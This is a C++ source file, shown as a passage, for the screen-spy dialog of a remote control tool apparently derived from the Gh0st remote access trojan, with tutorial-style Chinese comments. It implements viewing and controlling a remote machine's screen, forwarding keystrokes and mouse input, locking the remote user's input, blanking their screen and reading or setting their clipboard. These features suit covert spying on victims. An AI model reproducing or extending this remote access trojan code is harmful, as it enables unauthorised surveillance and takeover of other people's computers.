// CScreenSpyDlg.cpp: 实现文件
//

#include "pch.h"
#include "CcRemote.h"
#include "CScreenSpyDlg.h"
#include "afxdialogex.h"
#include "..\..\common\macros.h"

enum
{
	IDM_CONTROL = 0x0010,
	IDM_SEND_CTRL_ALT_DEL,
	IDM_TRACE_CURSOR,		// 跟踪显示远程鼠标
	IDM_BLOCK_INPUT,		// 锁定远程计算机输入
	IDM_BLANK_SCREEN,		// 黑屏
	IDM_CAPTURE_LAYER,		// 捕捉层
	IDM_SAVEDIB,			// 保存图片
	IDM_GET_CLIPBOARD,		// 获取剪贴板
	IDM_SET_CLIPBOARD,		// 设置剪贴板
	IDM_ALGORITHM_SCAN,		// 隔行扫描算法
	IDM_ALGORITHM_DIFF,		// 差异比较算法
	IDM_DEEP_1,				// 屏幕色彩深度.....
	IDM_DEEP_4_GRAY,
	IDM_DEEP_4_COLOR,
	IDM_DEEP_8_GRAY,
	IDM_DEEP_8_COLOR,
	IDM_DEEP_16,
	IDM_DEEP_32
};
// 两种算法
#define ALGORITHM_SCAN	1	// 速度很快，但碎片太多
#define ALGORITHM_DIFF	2	// 速度很慢，也占CPU，但是数据量都是最小的
// CScreenSpyDlg 对话框

IMPLEMENT_DYNAMIC(CScreenSpyDlg, CDialog)
CScreenSpyDlg::CScreenSpyDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(IDD_SCREENSPY, pParent)
{
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	m_bIsFirst = true; // 如果是第一次打开对话框，显示提示等待信息
	m_lpScreenDIB = NULL;
	char szPath[MAX_PATH];
	GetSystemDirectory(szPath, MAX_PATH);
	lstrcat(szPath, "\\shell32.dll");
	m_hIcon = ExtractIcon(AfxGetApp()->m_hInstance, szPath, 17/*网上邻居图标索引*/);

	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);

	m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";

	//重要的是这里，这里将服务端发送来的bmp结构头和服务端屏幕大小保存起来
	UINT	nBISize = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
	m_lpbmi = (BITMAPINFO *) new BYTE[nBISize];
	m_lpbmi_rect = (BITMAPINFO *) new BYTE[nBISize];
	//这里就是保存bmp位图头了
	memcpy(m_lpbmi, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBISize);
	memcpy(m_lpbmi_rect, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBISize);

	memset(&m_MMI, 0, sizeof(MINMAXINFO));

	m_bIsCtrl = false; // 默认不控制
	m_nCount = 0;
	m_bCursorIndex = 1;
}

CScreenSpyDlg::~CScreenSpyDlg()
{
}

void CScreenSpyDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}


BEGIN_MESSAGE_MAP(CScreenSpyDlg, CDialog)
	ON_WM_CLOSE()
	ON_WM_GETMINMAXINFO()
	ON_WM_HSCROLL()
	ON_WM_PAINT()
	ON_WM_SYSCOMMAND()
END_MESSAGE_MAP()


// CScreenSpyDlg 消息处理程序


void CScreenSpyDlg::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	m_pContext->m_Dialog[0] = 0;

	closesocket(m_pContext->m_Socket);

	::ReleaseDC(m_hWnd, m_hDC);
	DeleteObject(m_hFullBitmap);

	//关闭会进来两次，为了避免崩溃判断一下
	if (m_lpbmi)
		delete m_lpbmi;
	m_lpbmi = NULL;
	if (m_lpbmi_rect)
		delete m_lpbmi_rect;
	m_lpbmi_rect = NULL;
	SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)LoadCursor(NULL, IDC_ARROW));

	m_bIsCtrl = false;
	CDialog::OnClose();
}


BOOL CScreenSpyDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO:  在此添加额外的初始化
	//初始化菜单
	SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)LoadCursor(NULL, IDC_NO));
	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_CONTROL, "控制屏幕(&Y)");
		pSysMenu->AppendMenu(MF_STRING, IDM_SEND_CTRL_ALT_DEL, "发送Ctrl-Alt-Del(&K)");
		pSysMenu->AppendMenu(MF_STRING, IDM_TRACE_CURSOR, "跟踪服务端鼠标(&T)");
		pSysMenu->AppendMenu(MF_STRING, IDM_BLOCK_INPUT, "锁定服务端鼠标和键盘(&L)");
		pSysMenu->AppendMenu(MF_STRING, IDM_BLANK_SCREEN, "服务端黑屏(&B)");
		pSysMenu->AppendMenu(MF_STRING, IDM_CAPTURE_LAYER, "捕捉层(导致鼠标闪烁)(&L)");
		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEDIB, "保存快照(&S)");
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_GET_CLIPBOARD, "获取剪贴板(&R)");
		pSysMenu->AppendMenu(MF_STRING, IDM_SET_CLIPBOARD, "设置剪贴板(&L)");
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_ALGORITHM_SCAN, "隔行扫描算法(&S)");
		pSysMenu->AppendMenu(MF_STRING, IDM_ALGORITHM_DIFF, "差异比较算法(&X)");
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_1, "1 位黑白(&A)");
		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_4_GRAY, "4 位灰度(&B)");
		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_4_COLOR, "4 位彩色(&C)");
		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_8_GRAY, "8 位灰度(&D)");
		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_8_COLOR, "8 位彩色(&E)");
		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_16, "16位高彩(&F)");
		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_32, "32位真彩(&G)");

		pSysMenu->CheckMenuRadioItem(IDM_ALGORITHM_SCAN, IDM_ALGORITHM_DIFF, IDM_ALGORITHM_SCAN, MF_BYCOMMAND);
		pSysMenu->CheckMenuRadioItem(IDM_DEEP_4_GRAY, IDM_DEEP_32, IDM_DEEP_8_COLOR, MF_BYCOMMAND);
	}

	// TODO: Add extra initialization here
	CString str;
	str.Format("\\\\%s %d * %d", m_IPAddress, m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight);
	SetWindowText(str);

	m_HScrollPos = 0;
	m_VScrollPos = 0;
	m_hRemoteCursor = LoadCursor(NULL, IDC_ARROW);

	ICONINFO CursorInfo;
	::GetIconInfo(m_hRemoteCursor, &CursorInfo);
	if (CursorInfo.hbmMask != NULL)
		::DeleteObject(CursorInfo.hbmMask);
	if (CursorInfo.hbmColor != NULL)
		::DeleteObject(CursorInfo.hbmColor);
	m_dwCursor_xHotspot = CursorInfo.xHotspot;
	m_dwCursor_yHotspot = CursorInfo.yHotspot;

	m_RemoteCursorPos.x = 0;
	m_RemoteCursorPos.x = 0;
	m_bIsTraceCursor = false;

	// 初始化窗口大小结构  位图的图像数据
	//是我们分配好的缓冲区也就是说我们可以更改这个缓冲区里的数据来改变位图图像
	m_hDC = ::GetDC(m_hWnd);
	m_hMemDC = CreateCompatibleDC(m_hDC);
	m_hFullBitmap = CreateDIBSection(m_hDC, m_lpbmi, DIB_RGB_COLORS, &m_lpScreenDIB, NULL, NULL);
	SelectObject(m_hMemDC, m_hFullBitmap);
	SetScrollRange(SB_HORZ, 0, m_lpbmi->bmiHeader.biWidth);
	SetScrollRange(SB_VERT, 0, m_lpbmi->bmiHeader.biHeight);

	InitMMI();
	SendNext();
	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}


void CScreenSpyDlg::InitMMI(void)
{
	RECT	rectClient, rectWindow;
	GetWindowRect(&rectWindow);
	GetClientRect(&rectClient);
	ClientToScreen(&rectClient);

	int	nBorderWidth = rectClient.left - rectWindow.left; // 边框宽
	int	nTitleWidth = rectClient.top - rectWindow.top; // 标题栏的高度

	int	nWidthAdd = nBorderWidth * 2 + GetSystemMetrics(SM_CYHSCROLL);
	int	nHeightAdd = nTitleWidth + nBorderWidth + GetSystemMetrics(SM_CYVSCROLL);
	int	nMinWidth = 400 + nWidthAdd;
	int	nMinHeight = 300 + nHeightAdd;
	int	nMaxWidth = m_lpbmi->bmiHeader.biWidth + nWidthAdd;
	int	nMaxHeight = m_lpbmi->bmiHeader.biHeight + nHeightAdd;


	// 最小的Track尺寸
	m_MMI.ptMinTrackSize.x = nMinWidth;
	m_MMI.ptMinTrackSize.y = nMinHeight;

	// 最大化时窗口的位置
	m_MMI.ptMaxPosition.x = 1;
	m_MMI.ptMaxPosition.y = 1;

	// 窗口最大尺寸
	m_MMI.ptMaxSize.x = nMaxWidth;
	m_MMI.ptMaxSize.y = nMaxHeight;

	// 最大的Track尺寸也要改变
	m_MMI.ptMaxTrackSize.x = nMaxWidth;
	m_MMI.ptMaxTrackSize.y = nMaxHeight;
}


void CScreenSpyDlg::SendNext(void)
{
	BYTE	bBuff = COMMAND_NEXT;
	m_iocpServer->Send(m_pContext, &bBuff, 1);
}

//调整最大化最小化时会调用这个函数
void CScreenSpyDlg::OnGetMinMaxInfo(MINMAXINFO* lpMMI)
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	// 如果m_MMI已经被赋值
	if (m_MMI.ptMaxSize.x > 0)
		memcpy((void *)lpMMI, &m_MMI, sizeof(MINMAXINFO));
	CDialog::OnGetMinMaxInfo(lpMMI);
}


void CScreenSpyDlg::OnHScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar)
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	SCROLLINFO si;
	int	i;
	si.cbSize = sizeof(SCROLLINFO);
	si.fMask = SIF_ALL;
	GetScrollInfo(SB_HORZ, &si);

	switch (nSBCode)
	{
	case SB_LINEUP:
		i = nPos - 1;
		break;
	case SB_LINEDOWN:
		i = nPos + 1;
		break;
	case SB_THUMBPOSITION:
	case SB_THUMBTRACK:
		i = si.nTrackPos;
		break;
	default:
		return;
	}

	i = max(i, si.nMin);
	i = min(i, (int)(si.nMax - si.nPage + 1));

	RECT rect;
	GetClientRect(&rect);

	if ((rect.right + i) > m_lpbmi->bmiHeader.biWidth)
		i = m_lpbmi->bmiHeader.biWidth - rect.right;

	InterlockedExchange((PLONG)&m_HScrollPos, i);

	SetScrollPos(SB_HORZ, m_HScrollPos);

	PostMessage(WM_PAINT);
	CDialog::OnHScroll(nSBCode, nPos, pScrollBar);
}


void CScreenSpyDlg::OnPaint()
{
	CPaintDC dc(this); // device context for painting
					   // TODO: 在此处添加消息处理程序代码
					   // 不为绘图消息调用 CDialog::OnPaint()
	
	if (m_bIsFirst)
	{
		DrawTipString("Please wait - initial screen loading");
		return;
	}
	//这里同样用我们讲过的api 不过他的作用可不仅仅是用来抓图，他还可以显示图像，
	//为什么呢？  因为抓图，显示图，都是我们的片面想法，这个api的作用就是复制
	//设备的缓冲区，将桌面设备缓冲区复制到我们的内存缓冲区，这个就是抓图，
	//将内存缓冲区复制到设备缓冲区就是显示图了。。。。。。。。
	BitBlt
	(
		m_hDC,
		0,
		0,
		m_lpbmi->bmiHeader.biWidth,
		m_lpbmi->bmiHeader.biHeight,
		m_hMemDC,
		m_HScrollPos,
		m_VScrollPos,
		SRCCOPY
	);

	// (BYTE)-1 = 255;
	// Draw the cursor
	//这里画一下鼠标的图像
	if (m_bIsTraceCursor)
		DrawIconEx(
			m_hDC,									// handle to device context 
			m_RemoteCursorPos.x - ((int)m_dwCursor_xHotspot) - m_HScrollPos,
			m_RemoteCursorPos.y - ((int)m_dwCursor_yHotspot) - m_VScrollPos,
			m_CursorInfo.getCursorHandle(m_bCursorIndex == (BYTE)-1 ? 1 : m_bCursorIndex),	// handle to icon to draw 
			0, 0,										// width of the icon 
			0,											// index of frame in animated cursor 
			NULL,										// handle to background brush 
			DI_NORMAL | DI_COMPAT						// icon-drawing flags 
		);
}


void CScreenSpyDlg::DrawTipString(CString str)
{
	RECT rect;
	GetClientRect(&rect);
	COLORREF bgcol = RGB(0x00, 0x00, 0x00);
	COLORREF oldbgcol = SetBkColor(m_hDC, bgcol);
	COLORREF oldtxtcol = SetTextColor(m_hDC, RGB(0xff, 0x00, 0x00));
	ExtTextOut(m_hDC, 0, 0, ETO_OPAQUE, &rect, NULL, 0, NULL);

	DrawText(m_hDC, str, -1, &rect,
		DT_SINGLELINE | DT_CENTER | DT_VCENTER);

	SetBkColor(m_hDC, oldbgcol);
	SetTextColor(m_hDC, oldtxtcol);
}


void CScreenSpyDlg::OnReceiveComplete(void)
{
	m_nCount++;

	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_FIRSTSCREEN:
		DrawFirstScreen();            //这里显示第一帧图像 一会转到函数定义
		break;
	case TOKEN_NEXTSCREEN:
		if (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[1] == ALGORITHM_SCAN)
			DrawNextScreenRect();     //这里是第二帧之后的数据了---
		else
			DrawNextScreenDiff();     //----当然这里有两种算法 
		break;                         //我们能转到DrawFirstScreen函数定义
	case TOKEN_BITMAPINFO:
		ResetScreen();
		break;
	case TOKEN_CLIPBOARD_TEXT:
		UpdateLocalClipboard((char *)m_pContext->m_DeCompressionBuffer.GetBuffer(1), m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1);
		break;
	default:
		// 传输发生异常数据
		return;
	}
}



void CScreenSpyDlg::DrawFirstScreen(void)
{
	m_bIsFirst = false;
	//这里也很简单就是得到服务端发来的数据 ，将他拷贝到HBITMAP的缓冲区中，这样一个图像就出现了
	memcpy(m_lpScreenDIB, m_pContext->m_DeCompressionBuffer.GetBuffer(1), m_lpbmi->bmiHeader.biSizeImage);
	//我们到OnPaint()函数
	//OnPaint();
	PostMessage(WM_PAINT);
}


void CScreenSpyDlg::DrawNextScreenDiff(void)
{
	//这个函数也非常复杂 ，他不是直接画到屏幕上，而是更新一下变化部分的屏幕数据然后调用
	//OnPaint画上去
	// 根据鼠标是否移动和屏幕是否变化判断是否重绘鼠标，防止鼠标闪烁
	bool	bIsReDraw = false;
	int		nHeadLength = 1 + 1 + sizeof(POINT) + sizeof(BYTE); // 标识 + 算法 + 光标位置 + 光标类型索引
	LPVOID	lpFirstScreen = m_lpScreenDIB;
	LPVOID	lpNextScreen = m_pContext->m_DeCompressionBuffer.GetBuffer(nHeadLength);
	DWORD	dwBytes = m_pContext->m_DeCompressionBuffer.GetBufferLen() - nHeadLength;

	POINT	oldPoint;
	memcpy(&oldPoint, &m_RemoteCursorPos, sizeof(POINT));
	memcpy(&m_RemoteCursorPos, m_pContext->m_DeCompressionBuffer.GetBuffer(2), sizeof(POINT));

	// 鼠标移动了
	if (memcmp(&oldPoint, &m_RemoteCursorPos, sizeof(POINT)) != 0)
		bIsReDraw = true;

	// 光标类型发生变化
	int	nOldCursorIndex = m_bCursorIndex;
	m_bCursorIndex = m_pContext->m_DeCompressionBuffer.GetBuffer(10)[0];
	if (nOldCursorIndex != m_bCursorIndex)
	{
		bIsReDraw = true;
		if (m_bIsCtrl && !m_bIsTraceCursor)
			SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)m_CursorInfo.getCursorHandle(m_bCursorIndex == (BYTE)-1 ? 1 : m_bCursorIndex));
	}

	// 屏幕是否变化
	if (dwBytes > 0)
		bIsReDraw = true;

	__asm
	{
		mov ebx, [dwBytes]
		mov esi, [lpNextScreen]
		jmp	CopyEnd
		CopyNextBlock :
		mov edi, [lpFirstScreen]
			lodsd	// 把lpNextScreen的第一个双字节，放到eax中,就是DIB中改变区域的偏移
			add edi, eax	// lpFirstScreen偏移eax	
			lodsd // 把lpNextScreen的下一个双字节，放到eax中, 就是改变区域的大小
			mov ecx, eax
			sub ebx, 8 // ebx 减去 两个dword
			sub ebx, ecx // ebx 减去DIB数据的大小
			rep movsb
			CopyEnd :
		cmp ebx, 0 // 是否写入完毕
			jnz CopyNextBlock
	}

	if (bIsReDraw) PostMessage(WM_PAINT);
}


void CScreenSpyDlg::DrawNextScreenRect(void)
{
	//这个函数也非常复杂他将传送来的数据 得到变化的区域然后画到屏幕上

	// 根据鼠标是否移动和鼠标是否在变化的区域判断是否重绘鼠标，防止鼠标闪烁
	bool	bIsReDraw = false;
	int		nHeadLength = 1 + 1 + sizeof(POINT) + sizeof(BYTE); // 标识 + 算法 + 光标位置 + 光标类型索引
	LPVOID	lpFirstScreen = m_lpScreenDIB;
	LPVOID	lpNextScreen = m_pContext->m_DeCompressionBuffer.GetBuffer(nHeadLength);
	DWORD	dwBytes = m_pContext->m_DeCompressionBuffer.GetBufferLen() - nHeadLength;


	// 保存上次鼠标所在的位置
	RECT	rectOldPoint;
	::SetRect(&rectOldPoint, m_RemoteCursorPos.x, m_RemoteCursorPos.y,
		m_RemoteCursorPos.x + m_dwCursor_xHotspot, m_RemoteCursorPos.y + m_dwCursor_yHotspot);

	memcpy(&m_RemoteCursorPos, m_pContext->m_DeCompressionBuffer.GetBuffer(2), sizeof(POINT));

	//////////////////////////////////////////////////////////////////////////
	// 判断鼠标是否移动
	if ((rectOldPoint.left != m_RemoteCursorPos.x) || (rectOldPoint.top !=
		m_RemoteCursorPos.y))
		bIsReDraw = true;

	// 光标类型发生变化
	int	nOldCursorIndex = m_bCursorIndex;
	m_bCursorIndex = m_pContext->m_DeCompressionBuffer.GetBuffer(10)[0];
	if (nOldCursorIndex != m_bCursorIndex)
	{
		bIsReDraw = true;
		if (m_bIsCtrl && !m_bIsTraceCursor)
			SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)m_CursorInfo.getCursorHandle(m_bCursorIndex == (BYTE)-1 ? 1 : m_bCursorIndex));
	}

	// 判断鼠标所在区域是否发生变化
	DWORD	dwOffset = 0;
	while (dwOffset < dwBytes && !bIsReDraw)
	{
		LPRECT	lpRect = (LPRECT)((LPBYTE)lpNextScreen + dwOffset);
		RECT rectDest;
		if (IntersectRect(&rectDest, &rectOldPoint, lpRect))
			bIsReDraw = true;
		dwOffset += sizeof(RECT) + m_lpbmi_rect->bmiHeader.biSizeImage;
	}
	bIsReDraw = bIsReDraw && m_bIsTraceCursor;
	//////////////////////////////////////////////////////////////////////////

	dwOffset = 0;
	while (dwOffset < dwBytes)
	{
		LPRECT	lpRect = (LPRECT)((LPBYTE)lpNextScreen + dwOffset);
		int	nRectWidth = lpRect->right - lpRect->left;
		int	nRectHeight = lpRect->bottom - lpRect->top;

		m_lpbmi_rect->bmiHeader.biWidth = nRectWidth;
		m_lpbmi_rect->bmiHeader.biHeight = nRectHeight;
		m_lpbmi_rect->bmiHeader.biSizeImage = (((m_lpbmi_rect->bmiHeader.biWidth * m_lpbmi_rect->bmiHeader.biBitCount + 31) & ~31) >> 3)
			* m_lpbmi_rect->bmiHeader.biHeight;

		StretchDIBits(m_hMemDC, lpRect->left, lpRect->top, nRectWidth,
			nRectHeight, 0, 0, nRectWidth, nRectHeight, (LPBYTE)lpNextScreen + dwOffset + sizeof(RECT),
			m_lpbmi_rect, DIB_RGB_COLORS, SRCCOPY);

		// 不需要重绘鼠标的话，直接重绘变化的部分
		if (!bIsReDraw)
			StretchDIBits(m_hDC, lpRect->left - m_HScrollPos, lpRect->top - m_VScrollPos, nRectWidth,
				nRectHeight, 0, 0, nRectWidth, nRectHeight, (LPBYTE)lpNextScreen + dwOffset + sizeof(RECT),
				m_lpbmi_rect, DIB_RGB_COLORS, SRCCOPY);

		dwOffset += sizeof(RECT) + m_lpbmi_rect->bmiHeader.biSizeImage;
	}

	if (bIsReDraw) PostMessage(WM_PAINT);
}

//更改屏幕分辨率
void CScreenSpyDlg::ResetScreen(void)
{
	UINT	nBISize = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
	if (m_lpbmi != NULL)
	{
		int	nOldWidth = m_lpbmi->bmiHeader.biWidth;
		int	nOldHeight = m_lpbmi->bmiHeader.biHeight;

		delete[] m_lpbmi;
		delete[] m_lpbmi_rect;

		m_lpbmi = (BITMAPINFO *) new BYTE[nBISize];
		m_lpbmi_rect = (BITMAPINFO *) new BYTE[nBISize];

		memcpy(m_lpbmi, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBISize);
		memcpy(m_lpbmi_rect, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBISize);

		DeleteObject(m_hFullBitmap);
		m_hFullBitmap = CreateDIBSection(m_hDC, m_lpbmi, DIB_RGB_COLORS, &m_lpScreenDIB, NULL, NULL);
		SelectObject(m_hMemDC, m_hFullBitmap);

		memset(&m_MMI, 0, sizeof(MINMAXINFO));
		InitMMI();

		// 分辨率发生改变
		if (nOldWidth != m_lpbmi->bmiHeader.biWidth || nOldHeight != m_lpbmi->bmiHeader.biHeight)
		{
			RECT	rectClient, rectWindow;
			GetWindowRect(&rectWindow);
			GetClientRect(&rectClient);
			ClientToScreen(&rectClient);

			// 计算ClientRect与WindowRect的差距（标题栏，滚动条）
			rectWindow.right = m_lpbmi->bmiHeader.biWidth + rectClient.left + (rectWindow.right - rectClient.right);
			rectWindow.bottom = m_lpbmi->bmiHeader.biHeight + rectClient.top + (rectWindow.bottom - rectClient.bottom);
			MoveWindow(&rectWindow);
		}
	}
}

void CScreenSpyDlg::UpdateLocalClipboard(char *buf, int len)
{
	if (!::OpenClipboard(NULL))
		return;

	::EmptyClipboard();
	HGLOBAL hglbCopy = GlobalAlloc(GPTR, len);
	if (hglbCopy != NULL) {
		// Lock the handle and copy the text to the buffer.  
		LPTSTR lptstrCopy = (LPTSTR)GlobalLock(hglbCopy);
		memcpy(lptstrCopy, buf, len);
		GlobalUnlock(hglbCopy);          // Place the handle on the clipboard.  
		SetClipboardData(CF_TEXT, hglbCopy);
		GlobalFree(hglbCopy);
	}
	CloseClipboard();
}

#define MAKEDWORD(h,l)        (((unsigned long)h << 16) | l)

//用来截获消息的。我们可以通过重载它来处理键盘和鼠标消息。
BOOL CScreenSpyDlg::PreTranslateMessage(MSG* pMsg)
{
	// TODO: 在此添加专用代码和/或调用基类


	CRect rect;
	GetClientRect(&rect);

	switch (pMsg->message)
	{
	case WM_LBUTTONDOWN:
	case WM_LBUTTONUP:
	case WM_RBUTTONDOWN:
	case WM_RBUTTONUP:
	case WM_MOUSEMOVE:
	case WM_LBUTTONDBLCLK:
	case WM_RBUTTONDBLCLK:
	case WM_MBUTTONDOWN:
	case WM_MBUTTONUP:
	case WM_MOUSEWHEEL:
	{
		MSG	msg;
		memcpy(&msg, pMsg, sizeof(MSG));
		msg.lParam = MAKEDWORD(HIWORD(pMsg->lParam) + m_VScrollPos, LOWORD(pMsg->lParam) + m_HScrollPos);
		msg.pt.x += m_HScrollPos;
		msg.pt.y += m_VScrollPos;
		SendCommand(&msg);
	}
	break;
	case WM_KEYDOWN:
	case WM_KEYUP:
	case WM_SYSKEYDOWN:
	case WM_SYSKEYUP:
		if (pMsg->wParam != VK_LWIN && pMsg->wParam != VK_RWIN)
		{
			MSG	msg;
			memcpy(&msg, pMsg, sizeof(MSG));
			msg.lParam = MAKEDWORD(HIWORD(pMsg->lParam) + m_VScrollPos, LOWORD(pMsg->lParam) + m_HScrollPos);
			msg.pt.x += m_HScrollPos;
			msg.pt.y += m_VScrollPos;
			SendCommand(&msg);
		}
		if (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE)
			return true;
		break;
	default:
		break;
	}
	return CDialog::PreTranslateMessage(pMsg);
}


void CScreenSpyDlg::SendCommand(MSG* pMsg)
{
	if (!m_bIsCtrl)
		return;

	LPBYTE lpData = new BYTE[sizeof(MSG) + 1];
	lpData[0] = COMMAND_SCREEN_CONTROL;
	memcpy(lpData + 1, pMsg, sizeof(MSG));
	m_iocpServer->Send(m_pContext, lpData, sizeof(MSG) + 1);

	delete[] lpData;
}

void CScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	CMenu* pSysMenu = GetSystemMenu(FALSE);
	switch (nID)
	{
	case IDM_CONTROL:
	{
		m_bIsCtrl = !m_bIsCtrl;
		pSysMenu->CheckMenuItem(IDM_CONTROL, m_bIsCtrl ? MF_CHECKED : MF_UNCHECKED);

		if (m_bIsCtrl)
		{
			if (m_bIsTraceCursor)
				SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)AfxGetApp()->LoadCursor(IDC_DOT));
			else
				SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)m_hRemoteCursor);
		}
		else
			SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)LoadCursor(NULL, IDC_NO));
	}
	break;
	case IDM_SEND_CTRL_ALT_DEL:
	{
		BYTE	bToken = COMMAND_SCREEN_CTRL_ALT_DEL;
		m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
	}
	break;
	case IDM_TRACE_CURSOR: // 跟踪服务端鼠标
	{
		m_bIsTraceCursor = !m_bIsTraceCursor;
		pSysMenu->CheckMenuItem(IDM_TRACE_CURSOR, m_bIsTraceCursor ? MF_CHECKED : MF_UNCHECKED);
		if (m_bIsCtrl)
		{
			if (!m_bIsTraceCursor)
				SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)m_hRemoteCursor);
			else
				SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)AfxGetApp()->LoadCursor(IDC_DOT));
		}
		// 重绘消除或显示鼠标
		OnPaint();
	}
	break;
	case IDM_BLOCK_INPUT: // 锁定服务端鼠标和键盘
	{
		bool bIsChecked = pSysMenu->GetMenuState(IDM_BLOCK_INPUT, MF_BYCOMMAND) & MF_CHECKED;
		pSysMenu->CheckMenuItem(IDM_BLOCK_INPUT, bIsChecked ? MF_UNCHECKED : MF_CHECKED);

		BYTE	bToken[2];
		bToken[0] = COMMAND_SCREEN_BLOCK_INPUT;
		bToken[1] = !bIsChecked;
		m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
	}
	break;
	case IDM_BLANK_SCREEN: // 服务端黑屏
	{
		bool bIsChecked = pSysMenu->GetMenuState(IDM_BLANK_SCREEN, MF_BYCOMMAND) & MF_CHECKED;
		pSysMenu->CheckMenuItem(IDM_BLANK_SCREEN, bIsChecked ? MF_UNCHECKED : MF_CHECKED);

		BYTE	bToken[2];
		bToken[0] = COMMAND_SCREEN_BLANK;
		bToken[1] = !bIsChecked;
		m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
	}
	break;
	case IDM_CAPTURE_LAYER: // 捕捉层
	{
		bool bIsChecked = pSysMenu->GetMenuState(IDM_CAPTURE_LAYER, MF_BYCOMMAND) & MF_CHECKED;
		pSysMenu->CheckMenuItem(IDM_CAPTURE_LAYER, bIsChecked ? MF_UNCHECKED : MF_CHECKED);

		BYTE	bToken[2];
		bToken[0] = COMMAND_SCREEN_CAPTURE_LAYER;
		bToken[1] = !bIsChecked;
		m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
	}
	break;
	case IDM_SAVEDIB:
		SaveSnapshot();
		break;
	case IDM_GET_CLIPBOARD: // 获取剪贴板
	{
		BYTE	bToken = COMMAND_SCREEN_GET_CLIPBOARD;
		m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
	}
	break;
	case IDM_SET_CLIPBOARD: // 设置剪贴板
	{
		SendLocalClipboard();
	}
	break;
	case IDM_ALGORITHM_SCAN: // 隔行扫描算法
	{
		SendResetAlgorithm(ALGORITHM_SCAN);
		pSysMenu->CheckMenuRadioItem(IDM_ALGORITHM_SCAN, IDM_ALGORITHM_DIFF, IDM_ALGORITHM_SCAN, MF_BYCOMMAND);
	}
	break;
	case IDM_ALGORITHM_DIFF: // 差异比较算法
	{
		SendResetAlgorithm(ALGORITHM_DIFF);
		pSysMenu->CheckMenuRadioItem(IDM_ALGORITHM_SCAN, IDM_ALGORITHM_DIFF, IDM_ALGORITHM_DIFF, MF_BYCOMMAND);
	}
	break;
	case IDM_DEEP_1:
	{
		SendResetScreen(1);
		pSysMenu->CheckMenuRadioItem(IDM_DEEP_1, IDM_DEEP_32, IDM_DEEP_1, MF_BYCOMMAND);
	}
	break;
	case IDM_DEEP_4_GRAY:
	{
		SendResetScreen(3);
		pSysMenu->CheckMenuRadioItem(IDM_DEEP_1, IDM_DEEP_32, IDM_DEEP_4_GRAY, MF_BYCOMMAND);
	}
	break;
	case IDM_DEEP_4_COLOR:
	{
		SendResetScreen(4);
		pSysMenu->CheckMenuRadioItem(IDM_DEEP_1, IDM_DEEP_32, IDM_DEEP_4_COLOR, MF_BYCOMMAND);
	}
	break;
	case IDM_DEEP_8_GRAY:
	{
		SendResetScreen(7);
		pSysMenu->CheckMenuRadioItem(IDM_DEEP_1, IDM_DEEP_32, IDM_DEEP_8_GRAY, MF_BYCOMMAND);
	}
	break;
	case IDM_DEEP_8_COLOR:
	{
		SendResetScreen(8);
		pSysMenu->CheckMenuRadioItem(IDM_DEEP_1, IDM_DEEP_32, IDM_DEEP_8_COLOR, MF_BYCOMMAND);
	}
	break;
	case IDM_DEEP_16:
	{
		SendResetScreen(16);
		pSysMenu->CheckMenuRadioItem(IDM_DEEP_1, IDM_DEEP_32, IDM_DEEP_16, MF_BYCOMMAND);
	}
	break;
	case IDM_DEEP_32:
	{
		SendResetScreen(32);
